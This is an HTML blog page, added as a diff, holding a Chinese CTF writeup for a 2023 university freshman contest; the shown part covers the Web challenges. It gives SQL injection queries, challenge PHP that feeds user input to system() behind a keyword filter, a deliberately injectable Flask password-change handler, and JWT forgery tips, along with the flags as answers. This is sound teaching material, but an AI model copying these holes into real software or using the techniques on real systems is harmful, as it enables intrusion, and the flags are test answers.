@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"c-a-t-nust.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="这里是南京理工大学 C.A.T. 战队萌新杯的 Writeup。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="南京理工大学2023萌新杯">
+<meta property="og:url" content="https://c-a-t-nust.github.io/p/ab40d10f.html">
+<meta property="og:site_name" content="C.A.T. Team">
+<meta property="og:description" content="这里是南京理工大学 C.A.T. 战队萌新杯的 Writeup。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web1.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web2.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web3.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web4.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web5.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web6.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web7.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/web8.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c1.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c2.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c3.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c4.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c5.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c8.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c9.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124135029.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124142509.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124202406.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124210574.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124236912.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124253019.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124306959.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124313719.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124320893.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124327158.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124332732.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124341060.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124347555.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124357543.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124404020.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/image-20231016124414020.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r1.jpg">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r2.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r3.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r4.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r5.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r6.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r7.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r8.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r9.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r10.png">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/r11.jpg">
+<meta property="og:image" content="https://c-a-t-nust.github.io/images/c1c3f0f344a440864c956f4d81099610.png">
+<meta property="article:published_time" content="2023-10-19T09:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-14T11:03:10.622Z">
+<meta property="article:author" content="C.A.T.">
+<meta property="article:tag" content="南京理工大学萌新杯">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://c-a-t-nust.github.io/images/web1.png">
+
+
+<link rel="canonical" href="https://c-a-t-nust.github.io/p/ab40d10f.html">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://c-a-t-nust.github.io/p/ab40d10f.html","path":"p/ab40d10f.html","title":"南京理工大学2023萌新杯"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>南京理工大学2023萌新杯 | C.A.T. Team</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">C.A.T. Team</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">1.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-sql"><span class="nav-number">1.1.</span> <span class="nav-text">Baby_sql</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Payload"><span class="nav-number">1.1.1.</span> <span class="nav-text">Payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ez-Game"><span class="nav-number">1.2.</span> <span class="nav-text">Ez_Game</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%A5%9E%EF%BC%8C%E5%90%AF%E5%8A%A8%EF%BC%81"><span class="nav-number">1.3.</span> <span class="nav-text">原神，启动！</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Admin"><span class="nav-number">1.4.</span> <span class="nav-text">Admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login"><span class="nav-number">1.5.</span> <span class="nav-text">login</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">2.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#encode"><span class="nav-number">2.1.</span> <span class="nav-text">encode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hill%E5%9C%A3%E6%AE%BF"><span class="nav-number">2.2.</span> <span class="nav-text">hill圣殿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fense%E7%A5%9E%E5%BA%99"><span class="nav-number">2.3.</span> <span class="nav-text">fense神庙</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8FBOSS-KM"><span class="nav-number">2.4.</span> <span class="nav-text">小BOSS-KM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyRSA"><span class="nav-number">2.5.</span> <span class="nav-text">easyRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#normalRSA"><span class="nav-number">2.6.</span> <span class="nav-text">normalRSA</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Broken-RSA"><span class="nav-number">2.7.</span> <span class="nav-text">Broken RSA</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BIGBIGNUM"><span class="nav-number">3.1.</span> <span class="nav-text">BIGBIGNUM</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DMC-ESREVER"><span class="nav-number">3.2.</span> <span class="nav-text">DMC_ESREVER</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Easystack"><span class="nav-number">3.3.</span> <span class="nav-text">Easystack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%84%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="nav-number">3.3.1.</span> <span class="nav-text">常规栈溢出</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96%E6%A0%88%E4%B8%8A%E5%8F%98%E9%87%8F"><span class="nav-number">3.3.2.</span> <span class="nav-text">栈溢出覆盖栈上变量</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#EasyHeap"><span class="nav-number">3.4.</span> <span class="nav-text">EasyHeap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#StrangeGift"><span class="nav-number">3.5.</span> <span class="nav-text">StrangeGift</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%90%8E"><span class="nav-number">3.6.</span> <span class="nav-text">写在最后</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Re"><span class="nav-number">4.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#length"><span class="nav-number">4.1.</span> <span class="nav-text">length</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dbg"><span class="nav-number">4.2.</span> <span class="nav-text">dbg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xorxor"><span class="nav-number">4.3.</span> <span class="nav-text">xorxor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easyre"><span class="nav-number">4.4.</span> <span class="nav-text">easyre</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pyregex"><span class="nav-number">4.5.</span> <span class="nav-text">pyregex</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B0%8A%E5%98%9F%E5%81%87%E5%98%9F"><span class="nav-number">5.1.</span> <span class="nav-text">尊嘟假嘟</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%81%E9%87%8F"><span class="nav-number">5.2.</span> <span class="nav-text">流量</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%98%AF%E7%94%B7%E4%BA%BA%E5%B0%B1%E4%B8%8B%E4%B8%80%E7%99%BE%E5%B1%82"><span class="nav-number">5.3.</span> <span class="nav-text">是男人就下一百层</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ezLSB"><span class="nav-number">5.4.</span> <span class="nav-text">ezLSB</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HardLSB"><span class="nav-number">5.5.</span> <span class="nav-text">HardLSB</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">C.A.T.</p>
+  <div class="site-description" itemprop="description">C.A.T. Team</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://c-a-t-nust.github.io/p/ab40d10f.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="C.A.T.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C.A.T. Team">
+      <meta itemprop="description" content="C.A.T. Team">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="南京理工大学2023萌新杯 | C.A.T. Team">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          南京理工大学2023萌新杯
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-10-19 星期四 17:00:00" itemprop="dateCreated datePublished" datetime="2023-10-19T17:00:00+08:00">2023-10-19 星期四</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-09-14 星期六 19:03:10" itemprop="dateModified" datetime="2024-09-14T19:03:10+08:00">2024-09-14 星期六</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>这里是南京理工大学 C.A.T. 战队萌新杯的 Writeup。</p>
+<span id="more"></span>
+
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Baby-sql"><a href="#Baby-sql" class="headerlink" title="Baby_sql"></a>Baby_sql</h2><p>几乎完全移植去年的sql题，甚至还删掉了一些过滤（导致有些”小聪明”把flag改了,）</p>
+<p>本意还是为了考察新生sql语句的使用</p>
+<p>其实Sqlmap一把梭都可以出(</p>
+<p>登录依然是弱口令<code>admin</code> <code>123456</code></p>
+<p><img src="/../images/web1.png" alt="web1"></p>
+<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> database();</span><br><span class="line"># <span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">3</span>) &quot;ctf&quot; [&quot;database()&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">3</span>) &quot;ctf&quot; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>`ctf`;</span><br><span class="line"># <span class="keyword">array</span>(<span class="number">2</span>) &#123; [<span class="number">0</span>]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">21</span>) &quot;F11111@@@@@ggggg,USER&quot; [&quot;group_concat(table_name)&quot;]<span class="operator">=</span><span class="operator">&gt;</span> string(<span class="number">21</span>) &quot;F11111@@@@@ggggg,USER&quot; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `F11111@@@@<span class="variable">@ggggg</span>`;</span><br><span class="line"># 最后的payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>估计困惑点主要都在这个反引号上(</strong></p>
+<blockquote>
+<p>反引号（&#96;）[反引号在键盘的左上角]，用于标记「表名」和「列名」，通常情况<a target="_blank" rel="noopener" href="https://www.zhihu.com/search?q=%E5%8A%A0%E4%B8%8D%E5%8A%A0&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:2215848391%7D">加不加</a>都行。但如果「表名」或「列名」为 MySQL 保留符，那么一定要加反引号作为区分。</p>
+</blockquote>
+<p><img src="/../images/web2.png" alt="web2"></p>
+<p><img src="/../images/web3.png" alt="web3"></p>
+<p><img src="/../images/web4.png" alt="web4"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;Th1s_Is_Baby_SQL!!!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Ez-Game"><a href="#Ez-Game" class="headerlink" title="Ez_Game"></a>Ez_Game</h2><p><img src="/../images/web5.png" alt="web5"></p>
+<p>F12直接搜索<code>10000</code>或者<code>alert</code>就行</p>
+<p>最后是一个<code>base64加密</code>，解码就能获得Flag</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;Y0u_@re_a_G00D_Gamer!&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="原神，启动！"><a href="#原神，启动！" class="headerlink" title="原神，启动！"></a>原神，启动！</h2><p>访问<code>/genshin.php</code>路由会自动跳转到原神官网，可以看出是重定向</p>
+<p>那就只能用burpsuite抓个包再到Repeater模块下发包</p>
+<p>PHP版本为<code>7.4.21</code>, 用google搜索一下可以很快找到这个PHP版本的漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2235691">PHP&lt;&#x3D;7.4.21 Development Server源码泄露漏洞</a></p>
+<p><img src="/../images/web6.png" alt="web6">)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.1 302 found&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location:https://ys.mihoyo.com/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$asoul</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;asoul&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$asoul</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/cat|tac|tail|flag/i&#x27;</span>,<span class="variable">$asoul</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$asoul</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;玩原神玩的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 考察命令执行</span></span><br></pre></td></tr></table></figure>
+
+<p>最后实际上线的题目没有过滤<code>cat</code>, 更加简单</p>
+<p><img src="/../images/web7.png" alt="web7"></p>
+<p><img src="/../images/web8.png" alt="web8"></p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">njustCTF&#123;PHP_version_is_Imp0rtant&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h2><p>两个解法，第一个解法是unicode欺骗，思路来自<a target="_blank" rel="noopener" href="https://www.bilibili.com/read/cv18216987/">HCTF2018web——admin</a>，原题是</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">username = nodeprep.prepare(username)</span><br></pre></td></tr></table></figure>
+
+<p>利用了这个库函数的一个漏洞，但是去翻这个库函数的漏洞对于新生来说好像太难了，我就把这个漏洞的代码用一种更显然的方式重写成了那个函数</p>
+<p>但是这样一来好像太简单了有点。。。</p>
+<p>注册一个带unicode的admin账户，函数经过过滤会变为大写，就注册一个Admin账户，随后登录，在经过一次lower，会以admin身份登录从而实现欺骗</p>
+<p>解法二一个越权，注意到修改密码界面，抓包发现他的数据包里面有一个特殊的参数username，按理说改密码不需要这个参数，一看就有问题。但是这个username又不是当前用户的用户名，于是就去看一看这一部分的js代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> _0x2cfd=[<span class="string">&#x27;&#123;&#123;usna&#125;&#125;&#x27;</span>,<span class="string">&#x27;myform&#x27;</span>,<span class="string">&#x27;value&#x27;</span>,<span class="string">&#x27;charCodeAt&#x27;</span>,<span class="string">&#x27;getElementById&#x27;</span>];<span class="keyword">var</span> _0x4da0=<span class="keyword">function</span>(<span class="params">_0x2cfd4d,_0x4da0c8</span>)&#123;_0x2cfd4d=_0x2cfd4d-<span class="number">0x0</span>;<span class="keyword">var</span> _0x55bbcf=_0x2cfd[_0x2cfd4d];<span class="keyword">return</span> _0x55bbcf;&#125;;<span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x28a36f=<span class="string">&#x27;wh0i4xorK1ng&#x27;</span>;<span class="keyword">var</span> _0x5d13cc=<span class="title function_">_0x4da0</span>(<span class="string">&#x27;0x0&#x27;</span>);<span class="keyword">var</span> _0x50cc21=<span class="string">&#x27;&#x27;</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x51ad50=<span class="number">0x0</span>;_0x51ad50&lt;_0x5d13cc[<span class="string">&#x27;length&#x27;</span>];_0x51ad50++)&#123;_0x50cc21+=<span class="title class_">String</span>[<span class="string">&#x27;fromCharCode&#x27;</span>](_0x5d13cc[<span class="title function_">_0x4da0</span>(<span class="string">&#x27;0x3&#x27;</span>)](_0x51ad50)^_0x28a36f[<span class="string">&#x27;charCodeAt&#x27;</span>](_0x51ad50%_0x28a36f[<span class="string">&#x27;length&#x27;</span>]));&#125;<span class="variable language_">document</span>[<span class="title function_">_0x4da0</span>(<span class="string">&#x27;0x4&#x27;</span>)](<span class="string">&#x27;username&#x27;</span>)[<span class="title function_">_0x4da0</span>(<span class="string">&#x27;0x2&#x27;</span>)]=_0x50cc21;<span class="variable language_">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="title function_">_0x4da0</span>(<span class="string">&#x27;0x1&#x27;</span>))[<span class="string">&#x27;submit&#x27;</span>]();<span class="keyword">return</span>;&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>这是混淆过的js，经过阅读和逆向解密后可以发现这个用户名是异或了wh0i4xorK1ng得到的结果，猜测后端会进行解密并越权修改密码。于是抓包改包可以修改admin用户的密码。</p>
+<p>贴一下后端代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/changepwd&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;username&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        user=request.values.get(<span class="string">&#x27;usa&#x27;</span>)</span><br><span class="line">        key=<span class="string">&quot;wh0i4xorK1ng&quot;</span></span><br><span class="line">        res = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(user)):</span><br><span class="line">            res += <span class="built_in">chr</span>(<span class="built_in">ord</span>(user[i]) ^ <span class="built_in">ord</span>(key[i%<span class="built_in">len</span>(key)]))</span><br><span class="line">        passw = request.form[<span class="string">&quot;passw&quot;</span>]</span><br><span class="line">        key = hashlib.md5(passw.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        conn = sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>)</span><br><span class="line">        conn.execute(<span class="string">f&quot;update USER set passwordhash=&#x27;<span class="subst">&#123;key&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;res&#125;</span>&#x27;&quot;</span>)</span><br><span class="line">        conn.commit()</span><br><span class="line">        session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&#x27;&lt;script&gt;alert(&quot;修改成功,请重新登陆&quot;);window.location.replace(&quot;/&quot;);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;changepwd.html&#x27;</span>,usna=session[<span class="string">&#x27;username&#x27;</span>])</span><br></pre></td></tr></table></figure>
+
+<p>这一部分在附件里面是没有的，不然太简单了</p>
+<h2 id="login"><a href="#login" class="headerlink" title="login"></a>login</h2><p>规划里面这个题是比admin简单的，但是实际上解出的人不多</p>
+<p>首先是jwt爆破，然后是md5爆破，两次爆破拿到flag。第一次爆破拿到jwt的key是secret，随后伪造admin用户登录</p>
+<p>需要注意的是这里伪造的方法不只有爆破，还有通过CVE-2015-9235进行none加密的伪造来攻击。</p>
+<p>此外本来我的设计还有通过flask框架debug模式的开启，通过报错的方法来泄露报错位置附近一部分的源码从而泄露秘钥，但是最后忘记了把这个题的debug关了，所以这个攻击方法就失效了，这是我的锅。。。</p>
+<p>贴一个爆破脚本吧，这里jwt爆破和md5爆破都是可以自己写的，希望新生同学们注意代码能力的培养，多写代码。</p>
